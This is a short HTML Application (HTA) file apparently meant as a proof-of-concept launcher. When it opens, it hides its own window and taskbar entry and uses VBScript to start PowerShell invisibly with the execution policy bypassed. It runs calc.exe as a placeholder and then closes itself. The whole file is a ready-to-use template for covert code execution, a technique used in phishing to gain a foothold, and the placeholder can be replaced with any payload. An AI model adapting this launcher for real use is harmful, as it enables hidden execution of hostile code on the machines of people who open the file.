<html>
<head>
<HTA:APPLICATION
    ID="oHTA"
    APPLICATIONNAME="PowerShell Launcher"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
/>
<script language="VBScript">
Sub Window_OnLoad
    CreateObject("WScript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""calc.exe""", 0, False
    self.close
End Sub
</script>
</head>
